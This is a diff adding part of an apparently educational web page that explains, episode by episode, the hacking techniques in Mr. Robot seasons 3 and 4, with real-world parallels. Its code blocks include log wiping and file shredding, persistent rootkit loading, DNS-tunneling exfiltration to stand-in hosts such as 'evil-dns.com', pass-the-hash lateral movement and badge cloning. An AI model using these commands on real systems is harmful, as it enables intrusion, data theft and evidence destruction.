+          <li><strong>Scale:</strong> 71 buildings simultaneously targeted</li>
+          <li><strong>Impact:</strong> Physical destruction of paper records and building infrastructure</li>
+          <li><strong>Casualties:</strong> The attack results in deaths -- the first time the hack has lethal consequences</li>
+        </ul>
+        <div class="real-world">Samsung Galaxy Note 7 battery fires (2016) demonstrated real-world thermal runaway in lithium-ion batteries. Stuxnet (2010) showed firmware-level attacks causing physical destruction of centrifuges. TLStorm vulnerabilities in APC Smart-UPS (2022) confirmed that the show's premise was technically viable.</div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Emergency Lateral Movement</h5>
+        <p>Elliot races to issue emergency commands to halt the UPS firmware attack, <strong>pivoting through E Corp's network</strong> to reach OT systems controlling UPS units in remote buildings.</p>
+        <ul>
+          <li><strong>Lateral Movement:</strong> Moving from compromised system to access others in the network</li>
+          <li><strong>Living Off the Land:</strong> Using legitimate admin tools and credentials</li>
+          <li><strong>Emergency Patching:</strong> Attempting to push firmware fixes to remote UPS controllers</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>3. Physical Security &amp; SOC Response</h5>
+        <p>The single-take format showcases physical security measures (badge access, security guards, locked server rooms) and <strong>real-time Security Operations Center (SOC)</strong> incident response, with analysts reviewing alerts and logs as the attack unfolds.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S3E06 -->
+<div class="episode-card" id="s3e6">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">06</span>
+    <div class="ep-title-area">
+      <h3>Kill Process</h3>
+      <div class="ep-filename">eps3.5_kill-process.inc</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">False Flag</span>
+      <span class="tag attack">Attribution</span>
+      <span class="tag tool">Digital Forensics</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. False Flag Attribution</h5>
+        <p>The Dark Army stages evidence to make the 71-building attack appear to be <strong>state-sponsored by Iran</strong>. False flag operations in cyber warfare involve planting misleading evidence to misdirect attribution.</p>
+        <ul>
+          <li><strong>Planted Evidence:</strong> Foreign-language strings in malware code</li>
+          <li><strong>Infrastructure Mimicry:</strong> Using IP addresses/infrastructure associated with Iranian APT groups</li>
+          <li><strong>TTP Imitation:</strong> Mimicking Tactics, Techniques, and Procedures of known Iranian groups</li>
+          <li><strong>Compilation Timestamps:</strong> Setting timestamps to match Iranian business hours</li>
+        </ul>
+        <div class="real-world">Olympic Destroyer (2018) -- malware targeting the Pyeongchang Olympics contained sophisticated false flags pointing to North Korea and China. It was ultimately attributed to Russian GRU (Sandworm team). This demonstrated that false flag attribution in cyber operations is a real and effective tactic.</div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Digital Forensics Investigation</h5>
+        <p>The FBI conducts forensic analysis of the compromised UPS controllers:</p>
+        <ul>
+          <li><strong>Forensic Disk Imaging:</strong> Bit-for-bit copies of compromised firmware/storage</li>
+          <li><strong>Firmware Analysis:</strong> Reverse engineering modified firmware binaries</li>
+          <li><strong>Chain of Custody:</strong> Maintaining legal admissibility of digital evidence</li>
+          <li><strong>Attribution Challenges:</strong> Distinguishing real IOCs from planted false flags</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>3. Evidence Destruction</h5>
+        <p>Characters destroy digital evidence linking them to Stage 2:</p>
+        <div class="code-block"><span class="comment"># Secure file deletion</span>
+shred -vfz -n 7 /path/to/evidence
+srm -sz /path/to/sensitive_files/
+
+<span class="comment"># Overwrite free disk space</span>
+dd if=/dev/urandom of=/tmp/fill bs=1M; rm -f /tmp/fill
+
+<span class="comment"># Clear system logs</span>
+journalctl --vacuum-time=1s
+echo "" | tee /var/log/auth.log /var/log/syslog</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S3E07 -->
+<div class="episode-card" id="s3e7">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">07</span>
+    <div class="ep-title-area">
+      <h3>Fredrick + Tanya</h3>
+      <div class="ep-filename">eps3.6_fredrick+tanya.chk</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag hardware">Femtocell</span>
+      <span class="tag attack">SS7 Exploitation</span>
+      <span class="tag attack">MITM Cellular</span>
+      <span class="tag hardware">USRP SDR</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. FBI Femtocell Hack Execution</h5>
+        <p>The femtocell attack against the FBI reaches full operational capability. The <strong>modified femtocell</strong> inside the FBI field office intercepts all cellular communications:</p>
+        <ul>
+          <li><strong>Hardware:</strong> Modified consumer femtocell + USRP (Universal Software Radio Peripheral) SDR</li>
+          <li><strong>Software:</strong> OpenBTS or OsmocomBB for GSM/3G stack</li>
+          <li><strong>Capture Tool:</strong> Wireshark for traffic capture and analysis</li>
+          <li><strong>Interception:</strong> Voice calls, SMS, mobile data, location data</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>2. SS7 Protocol Exploitation</h5>
+        <p>The femtocell leverages weaknesses in <strong>SS7 (Signaling System 7)</strong>, the protocol suite governing global telecommunications. SS7 was designed in the 1970s with no authentication, allowing anyone with network access to intercept calls and SMS.</p>
+        <ul>
+          <li><strong>Call Interception:</strong> Redirect calls through attacker infrastructure</li>
+          <li><strong>SMS Interception:</strong> Read SMS messages in transit (including 2FA codes)</li>
+          <li><strong>Location Tracking:</strong> Query subscriber location in real-time</li>
+          <li><strong>Call Forwarding:</strong> Silently redirect calls without user knowledge</li>
+        </ul>
+        <div class="real-world">In 2014, German researchers demonstrated SS7 attacks on 60 Minutes (CBS), intercepting a US congressman's phone calls with his knowledge. SS7 vulnerabilities have been used to intercept 2FA SMS codes for bank fraud. The GSMA has acknowledged these vulnerabilities but full remediation remains incomplete.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S3E08 -->
+<div class="episode-card" id="s3e8">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">08</span>
+    <div class="ep-title-area">
+      <h3>Don't Delete Me</h3>
+      <div class="ep-filename">eps3.7_dont-delete-me.ko</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Kernel Rootkit</span>
+      <span class="tag attack">Browser Fingerprinting</span>
+      <span class="tag tool">File Carving</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Linux Kernel Module Rootkits (.ko)</h5>
+        <p>The <strong>.ko</strong> extension references Linux kernel object files -- loadable kernel modules. A malicious .ko file operates at the deepest OS level:</p>
+        <ul>
+          <li><strong>Syscall Hooking:</strong> Intercept system calls to hide files, processes, and network connections</li>
+          <li><strong>DKOM:</strong> Directly manipulate kernel data structures</li>
+          <li><strong>Keylogging:</strong> Capture keystrokes at the kernel level</li>
+          <li><strong>Persistence:</strong> Survive reboots if installed in /etc/modules or initramfs</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Load a kernel module</span>
+insmod rootkit.ko
+<span class="comment"># Or persistently</span>
+cp rootkit.ko /lib/modules/$(uname -r)/
+depmod -a
+echo "rootkit" >> /etc/modules
+
+<span class="comment"># Detection</span>
+lsmod | grep suspicious
+cat /proc/modules
+<span class="comment"># Compare loaded modules with expected baseline</span></div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Data Recovery &amp; File Carving</h5>
+        <p>The "don't delete me" title references <strong>data recovery</strong> -- deleted files can often be recovered because deletion only removes filesystem pointers, not the actual data on disk.</p>
+        <ul>
+          <li><strong>Autopsy / Sleuth Kit:</strong> Open-source digital forensics platform</li>
+          <li><strong>PhotoRec:</strong> File carving tool that recovers files based on headers/signatures</li>
+          <li><strong>Scalpel:</strong> High-performance file carver</li>
+          <li><strong>extundelete:</strong> Recover deleted files from ext3/ext4 filesystems</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S3E09 -->
+<div class="episode-card" id="s3e9">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">09</span>
+    <div class="ep-title-area">
+      <h3>Stage 3</h3>
+      <div class="ep-filename">eps3.8_stage3.torrent</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag tool">BitTorrent</span>
+      <span class="tag attack">Key Recovery</span>
+      <span class="tag tool">Shamir's Secret Sharing</span>
+      <span class="tag attack">Traffic Analysis</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. BitTorrent for Mass Data Distribution</h5>
+        <p>The <strong>.torrent</strong> extension references the BitTorrent protocol for decentralized file distribution. Once data is seeded across the P2P network, it becomes nearly impossible to remove.</p>
+        <ul>
+          <li><strong>Mechanism:</strong> Files split into pieces, distributed across peers</li>
+          <li><strong>Resilience:</strong> No central server; removal requires taking down all seeders</li>
+          <li><strong>Anonymity:</strong> Magnet links require no tracker; DHT provides decentralized discovery</li>
+        </ul>
+        <div class="real-world">WikiLeaks distributed "insurance files" via BitTorrent -- encrypted archives that could be decrypted if anything happened to the organization. This ensures information survival even if the source is compromised.</div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Reversing 5/9 Encryption &amp; Key Recovery</h5>
+        <p>Elliot works to recover E Corp's encryption keys using <strong>Shamir's Secret Sharing</strong> -- a cryptographic scheme that splits a secret into parts where a minimum threshold of parts is needed to reconstruct it.</p>
+        <ul>
+          <li><strong>Shamir's Secret Sharing:</strong> (k, n) threshold scheme -- need k of n shares to reconstruct</li>
+          <li><strong>HSM Key Recovery:</strong> Accessing backup key material from Hardware Security Modules</li>
+          <li><strong>Key Fragments:</strong> Distributed across multiple secure locations</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>3. NetFlow Traffic Analysis</h5>
+        <p>FBI conducts <strong>NetFlow analysis</strong> to trace Dark Army communications by examining network flow metadata:</p>
+        <ul>
+          <li><strong>NetFlow:</strong> Cisco protocol recording source/destination IPs, ports, protocols, bytes transferred</li>
+          <li><strong>Correlation:</strong> Matching timestamps and packet sizes to de-anonymize traffic</li>
+          <li><strong>Pattern Recognition:</strong> Identifying communication patterns despite encryption</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S3E10 -->
+<div class="episode-card" id="s3e10">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">10</span>
+    <div class="ep-title-area">
+      <h3>Shutdown -r (Season Finale)</h3>
+      <div class="ep-filename">eps3.9_shutdown-r</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Key Distribution</span>
+      <span class="tag attack">DNS Tunneling</span>
+      <span class="tag attack">Supply Chain</span>
+      <span class="tag attack">Anti-Forensics</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Reversing the 5/9 Hack</h5>
+        <p>Elliot successfully ships E Corp's encryption keys to reverse the original hack. The challenge of <strong>PKI (Public Key Infrastructure) key distribution at scale</strong> -- distributing decryption keys securely to thousands of systems.</p>
+        <div class="code-block"><span class="comment"># The shutdown -r command (episode title)</span>
+shutdown -r now     <span class="comment"># Reboot system immediately</span>
+shutdown -r +5      <span class="comment"># Reboot in 5 minutes</span>
+<span class="comment"># Symbolically represents a "reset" for both systems and narrative</span></div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Femtocell Data Exfiltration via DNS Tunneling</h5>
+        <p>Data captured by the femtocell is exfiltrated using <strong>DNS tunneling</strong> -- encoding data within DNS queries and responses to bypass firewalls and content filters.</p>
+        <div class="code-block"><span class="comment"># DNS tunneling concept</span>
+<span class="comment"># Encode data as subdomain queries</span>
+nslookup dGhpcyBpcyBleGZpbHRyYXRlZCBkYXRh.evil-dns.com
+
+<span class="comment"># Tools: iodine, dnscat2, dns2tcp</span>
+dnscat2 --dns host=attacker-dns.com,type=TXT
+<span class="comment"># Data is encoded in DNS TXT records, bypassing most firewalls</span></div>
+      </div>
+      <div class="hack-detail">
+        <h5>3. Supply Chain Attack Concepts</h5>
+        <p>The season reveals that the entire attack chain relied on <strong>supply chain compromise</strong> -- the UPS firmware was intercepted and modified during the update/deployment pipeline.</p>
+        <div class="real-world">This presaged real-world supply chain attacks: SolarWinds (2020) compromised the Orion build process affecting 18,000+ organizations including US government agencies. Kaseya (2021) was used to distribute REvil ransomware to MSP customers. The show was years ahead of these real incidents.</div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+<div class="season-section" id="s4">
+<div class="season-header">
+  <h2>// SEASON 4</h2>
+  <p>The final season. Elliot takes on the Deus Group -- a shadow cabal of the world's most powerful people. Episode titles follow HTTP status codes (401-413). Features the Deus Group bank heist, physical penetration testing, and the series' most ambitious hacking sequences.</p>
+</div>
+
+<!-- S4E01 -->
+<div class="episode-card" id="s4e1">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">01</span>
+    <div class="ep-title-area">
+      <h3>401 Unauthorized</h3>
+      <div class="ep-filename">eps4.0_401unauthorized.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">VM Detection</span>
+      <span class="tag social">OSINT</span>
+      <span class="tag social">Physical Surveillance</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Virtual Machine Detection &amp; Sandbox Evasion</h5>
+        <p>Elliot discovers a target system is running inside a virtual machine. <strong>VM detection</strong> is critical for malware that needs to evade sandbox analysis and for attackers identifying honeypots.</p>
+        <ul>
+          <li><strong>MAC Address Prefixes:</strong> VMware (00:0C:29, 00:50:56), VirtualBox (08:00:27)</li>
+          <li><strong>Process Checks:</strong> vmtoolsd, vmwaretray, VBoxService.exe, VBoxTray.exe</li>
+          <li><strong>Registry Keys:</strong> HKLM\SOFTWARE\VMware, HKLM\SOFTWARE\Oracle\VirtualBox</li>
+          <li><strong>CPUID:</strong> Hypervisor bit check via CPUID instruction</li>
+          <li><strong>WMI Queries:</strong> Win32_ComputerSystem model containing "VIRTUAL" or "VMWARE"</li>
+          <li><strong>Tool:</strong> Pafish (Paranoid Fish) -- automated sandbox/VM detection</li>
+        </ul>
+        <div class="code-block"><span class="comment"># VM detection checks</span>
+systemd-detect-virt                     <span class="comment"># Linux - detects virtualization</span>
+dmidecode -s system-manufacturer        <span class="comment"># Check hardware manufacturer</span>
+lspci | grep -i vmware                  <span class="comment"># Check for VM hardware</span>
+cat /proc/scsi/scsi | grep -i vmware   <span class="comment"># Check SCSI devices</span>
+
+<span class="comment"># Windows checks</span>
+wmic computersystem get model           <span class="comment"># "VMware Virtual Platform"</span>
+reg query "HKLM\SOFTWARE\VMware, Inc.\VMware Tools"</div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. OSINT on Deus Group Members</h5>
+        <p>Elliot performs <strong>open-source intelligence</strong> gathering on Deus Group members, including financial records analysis, social media profiling, and network mapping of relationships between the world's most powerful individuals.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E02 -->
+<div class="episode-card" id="s4e2">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">02</span>
+    <div class="ep-title-area">
+      <h3>402 Payment Required</h3>
+      <div class="ep-filename">eps4.1_402paymentrequired.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag social">Bank Social Engineering</span>
+      <span class="tag attack">SWIFT Network</span>
+      <span class="tag attack">RAT Deployment</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Targeting Cyprus National Bank</h5>
+        <p>Elliot targets the offshore banking infrastructure used by the Deus Group, performing reconnaissance on <strong>SWIFT network infrastructure</strong> -- the global system used for international wire transfers between banks.</p>
+        <ul>
+          <li><strong>SWIFT:</strong> Society for Worldwide Interbank Financial Telecommunication</li>
+          <li><strong>Attack Surface:</strong> SWIFT Alliance Access terminals in bank networks</li>
+          <li><strong>Recon:</strong> Mapping financial routing, identifying target accounts</li>
+        </ul>
+        <div class="real-world">The Bangladesh Bank heist (2016) saw attackers compromise SWIFT terminals to issue fraudulent transfer orders for $951 million, successfully stealing $81 million. This remains one of the largest cyber heists in history.</div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Social Engineering of Bank Employees</h5>
+        <p><strong>Pretexting</strong> -- creating fabricated scenarios to extract information from bank staff about internal procedures, account structures, and security protocols.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E03 -->
+<div class="episode-card" id="s4e3">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">03</span>
+    <div class="ep-title-area">
+      <h3>403 Forbidden</h3>
+      <div class="ep-filename">eps4.2_403forbidden.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">UEFI Rootkit</span>
+      <span class="tag hardware">USB Rubber Ducky</span>
+      <span class="tag social">Physical Access</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Firmware-Level Rootkits (UEFI/BIOS)</h5>
+        <p>Discussion of <strong>firmware-level compromise</strong> where malware is embedded below the OS layer, surviving OS reinstalls and disk wipes.</p>
+        <ul>
+          <li><strong>UEFI Rootkits:</strong> Persist in motherboard firmware (SPI flash)</li>
+          <li><strong>Survival:</strong> Cannot be removed by OS reinstall, disk format, or drive replacement</li>
+          <li><strong>Detection:</strong> Requires firmware integrity checking tools</li>
+        </ul>
+        <div class="real-world">LoJax (discovered by ESET, 2018) was the first UEFI rootkit found in the wild, attributed to APT28 (Fancy Bear/Russian GRU). It persisted across OS reinstalls by modifying the SPI flash chip on the motherboard.</div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. USB Keystroke Injection</h5>
+        <p>The <strong>USB Rubber Ducky</strong> returns as a physical access attack vector, executing pre-programmed keystroke payloads when plugged into a target system.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E04 -->
+<div class="episode-card" id="s4e4">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">04</span>
+    <div class="ep-title-area">
+      <h3>404 Not Found</h3>
+      <div class="ep-filename">eps4.3_404notfound.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Lateral Movement</span>
+      <span class="tag attack">SIM Swapping</span>
+      <span class="tag tool">Signal Protocol</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Lateral Movement Techniques</h5>
+        <p>Advanced <strong>lateral movement</strong> through compromised networks using Windows domain attack tools:</p>
+        <div class="code-block"><span class="comment"># Lateral movement techniques</span>
+psexec.py domain/user:password@target cmd.exe    <span class="comment"># PsExec via Impacket</span>
+wmiexec.py domain/user:password@target            <span class="comment"># WMI execution</span>
+smbexec.py domain/user:password@target            <span class="comment"># SMB execution</span>
+
+<span class="comment"># Pass-the-Hash (no password needed, just the NTLM hash)</span>
+pth-winexe -U domain/user%hash //target cmd.exe
+
+<span class="comment"># Kerberos ticket attacks</span>
+getTGT.py domain/user -hashes :ntlm_hash          <span class="comment"># Get TGT with hash</span>
+getST.py -spn cifs/target domain/user              <span class="comment"># Get service ticket</span></div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. SIM Swapping</h5>
+        <p><strong>SIM swapping</strong> involves social engineering a mobile carrier employee to transfer a victim's phone number to an attacker-controlled SIM card, enabling interception of calls, SMS, and 2FA codes.</p>
+        <ul>
+          <li><strong>Vector:</strong> Social engineering carrier call center employees</li>
+          <li><strong>Impact:</strong> Takeover of phone number, interception of 2FA SMS codes</li>
+          <li><strong>Targets:</strong> High-value individuals with cryptocurrency, banking access</li>
+        </ul>
+        <div class="real-world">SIM swapping has been used in numerous high-profile attacks, including the 2019 hack of Twitter CEO Jack Dorsey's account. In 2021, a SIM swapper was convicted for stealing $20 million in cryptocurrency.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E05 - SILENT EPISODE -->
+<div class="episode-card" id="s4e5">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">05</span>
+    <div class="ep-title-area">
+      <h3>405 Method Not Allowed (Silent Episode)</h3>
+      <div class="ep-filename">eps4.4_405methodnotallowed.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag social">Physical Pentest</span>
+      <span class="tag hardware">Proxmark3</span>
+      <span class="tag hardware">Network Tap</span>
+      <span class="tag attack">Lock Picking</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Physical Penetration of Virtual Realty Data Center</h5>
+        <p>The famous <strong>near-silent episode</strong> follows Elliot and Darlene breaking into a secure server facility in real-time. This is one of the most technically detailed physical penetration testing sequences in television.</p>
+      </div>
+      <div class="hack-detail">
+        <h5>2. RFID/NFC Badge Cloning</h5>
+        <p>Access badges are cloned using specialized hardware:</p>
+        <ul>
+          <li><strong>Proxmark3:</strong> Advanced RFID research tool for cloning HID iClass, MIFARE, EM4100 cards</li>
+          <li><strong>ACR122U:</strong> NFC reader/writer for MIFARE and NFC tags</li>
+          <li><strong>Attack Range:</strong> Some readers can capture badge data from several feet away</li>
+          <li><strong>Write:</strong> Clone captured credentials to blank cards</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Proxmark3 badge cloning</span>
+proxmark3> lf search                      <span class="comment"># Auto-detect card type</span>
+proxmark3> lf hid read                    <span class="comment"># Read HID card</span>
+proxmark3> lf hid clone 2006xxxxxxxx     <span class="comment"># Clone to blank card</span>
+
+<span class="comment"># For MIFARE cards</span>
+proxmark3> hf mf rdsc                     <span class="comment"># Read sector</span>
+proxmark3> hf mf cload                    <span class="comment"># Clone entire card</span></div>
+      </div>
+      <div class="hack-detail">
+        <h5>3. Lock Picking</h5>
+        <p>Physical bypass of door locks using professional lockpicking tools: tension wrenches, pick sets, bypass tools. Standard practice in professional red team engagements.</p>
+      </div>
+      <div class="hack-detail">
+        <h5>4. Network Tap Installation</h5>
+        <p>Installing a <strong>passive network tap</strong> to intercept traffic without detection:</p>
+        <ul>
+          <li><strong>Throwing Star LAN Tap:</strong> Passive ethernet tap that requires no power</li>
+          <li><strong>Inline Tap:</strong> More sophisticated tap that can capture full-duplex traffic</li>
+          <li><strong>Advantage:</strong> Passive taps are undetectable by network monitoring (no MAC address, no power draw)</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>5. Boot from External Media</h5>
+        <p>Bypassing OS authentication by <strong>booting from a USB drive</strong> containing a live Linux distribution (Kali Linux), providing direct access to the filesystem without needing the installed OS password.</p>
+      </div>
+      <div class="hack-detail">
+        <h5>6. Security Camera Avoidance</h5>
+        <p>Mapping camera coverage and timing movements to <strong>exploit blind spots</strong>. Physical pentesters observe camera rotation patterns, identify dead zones, and coordinate movement accordingly.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E06 -->
+<div class="episode-card" id="s4e6">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">06</span>
+    <div class="ep-title-area">
+      <h3>406 Not Acceptable</h3>
+      <div class="ep-filename">eps4.5_406notacceptable.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Counter-Surveillance</span>
+      <span class="tag tool">SIEM/Splunk</span>
+      <span class="tag attack">Dead Man's Switch</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. FBI Surveillance Evasion</h5>
+        <p>Counter-surveillance techniques to detect and evade FBI monitoring:</p>
+        <ul>
+          <li><strong>Tail Detection:</strong> Identifying physical surveillance teams through route changes</li>
+          <li><strong>GPS Tracker Detection:</strong> Sweeping vehicles for planted tracking devices</li>
+          <li><strong>RF Sweeping:</strong> Detecting hidden listening devices and transmitters</li>
+          <li><strong>Device Hardening:</strong> Removing batteries from phones, using Faraday bags</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Log Analysis &amp; SIEM</h5>
+        <p>Forensic <strong>log analysis</strong> using enterprise tools:</p>
+        <ul>
+          <li><strong>Splunk:</strong> Enterprise log aggregation and analysis</li>
+          <li><strong>ELK Stack:</strong> Elasticsearch + Logstash + Kibana for log processing</li>
+          <li><strong>Windows Event Logs:</strong> Security, System, Application logs</li>
+          <li><strong>Syslog:</strong> Centralized Unix/Linux logging</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E07 -->
+<div class="episode-card" id="s4e7">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">07</span>
+    <div class="ep-title-area">
+      <h3>407 Proxy Authentication Required</h3>
+      <div class="ep-filename">eps4.6_407proxyauthenticationrequired.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag tool">Proxychains</span>
+      <span class="tag tool">SOCKS5</span>
+      <span class="tag attack">Default Credentials</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Proxy Chains &amp; Traffic Obfuscation</h5>
+        <p>Using multiple proxy servers to hide traffic origin:</p>
+        <div class="code-block"><span class="comment"># Proxychains configuration</span>
+<span class="comment"># /etc/proxychains4.conf</span>
+strict_chain
+proxy_dns
+socks5 127.0.0.1 9050      <span class="comment"># Tor</span>
+socks5 proxy1.net 1080      <span class="comment"># VPN exit 1</span>
+socks5 proxy2.net 1080      <span class="comment"># VPN exit 2</span>
+http   proxy3.net 8080      <span class="comment"># HTTP proxy</span>
+
+<span class="comment"># Route any tool through proxy chain</span>
+proxychains4 nmap -sT target
+proxychains4 curl http://target
+proxychains4 ssh user@target</div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. IP Camera Default Credentials</h5>
+        <p>Surveillance cameras compromised via <strong>default credentials</strong> -- a pervasive vulnerability in CCTV systems. Many IP cameras ship with admin/admin or similar defaults that are never changed.</p>
+        <div class="real-world">Shodan (the IoT search engine) regularly finds hundreds of thousands of IP cameras with default credentials exposed to the internet. The Insecam website once aggregated feeds from thousands of unsecured cameras worldwide.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E08 -->
+<div class="episode-card" id="s4e8">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">08</span>
+    <div class="ep-title-area">
+      <h3>408 Request Timeout</h3>
+      <div class="ep-filename">eps4.7_408requesttimeout.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Email Header Analysis</span>
+      <span class="tag tool">VeraCrypt</span>
+      <span class="tag attack">ICS/SCADA</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Email Header Analysis</h5>
+        <p>Tracing email origins by analyzing <strong>email headers</strong>:</p>
+        <ul>
+          <li><strong>Received Fields:</strong> Show the path through mail servers (read bottom to top)</li>
+          <li><strong>X-Originating-IP:</strong> Reveals sender's original IP address</li>
+          <li><strong>Message-ID:</strong> Can reveal server information and domain</li>
+          <li><strong>SPF/DKIM/DMARC:</strong> Email authentication records for spoofing detection</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Encrypted File Systems &amp; Hidden Volumes</h5>
+        <p>Using <strong>encrypted volumes with plausible deniability</strong>:</p>
+        <ul>
+          <li><strong>VeraCrypt:</strong> Full-disk encryption with hidden volume support</li>
+          <li><strong>LUKS:</strong> Linux Unified Key Setup for disk encryption</li>
+          <li><strong>Hidden Volumes:</strong> A second encrypted volume hidden within the first -- even under coercion, the existence of the hidden volume cannot be proven</li>
+        </ul>
+        <div class="code-block"><span class="comment"># LUKS encrypted volume</span>
+cryptsetup luksFormat /dev/sdb1
+cryptsetup luksOpen /dev/sdb1 secure_volume
+mkfs.ext4 /dev/mapper/secure_volume
+mount /dev/mapper/secure_volume /mnt/secure</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E09 - THE DEUS GROUP HACK -->
+<div class="episode-card" id="s4e9">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">09</span>
+    <div class="ep-title-area">
+      <h3>409 Conflict (The Deus Group Hack)</h3>
+      <div class="ep-filename">eps4.8_409conflict.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">SWIFT Compromise</span>
+      <span class="tag attack">Wire Transfer Hijack</span>
+      <span class="tag social">Vishing</span>
+      <span class="tag attack">2FA Bypass</span>
+      <span class="tag attack">SS7 Exploit</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>THE DEUS GROUP HACK -- Complete Multi-Stage Attack Chain</h5>
